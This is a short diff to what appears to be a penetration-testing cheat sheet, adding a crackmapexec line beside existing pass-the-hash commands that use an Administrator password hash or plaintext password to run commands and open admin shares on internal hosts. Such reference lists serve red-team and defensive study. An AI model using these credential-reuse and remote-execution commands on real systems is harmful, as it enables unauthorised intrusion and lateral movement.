@@ -112,6 +112,7 @@
 | pth-wims -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25 "cmd.exe /c   whoami > c:\temp\result.txt" |
 | pth-smbclient -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //x.x.x.10/c$ |
 | pth-rpcclient -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //x.x.x.10 |
+|crackmapexec 192.168.1.1 -u Administrator -p '1234567qA' -x whoami|
 
 | PowerShell Remoting |
 | ------------- |
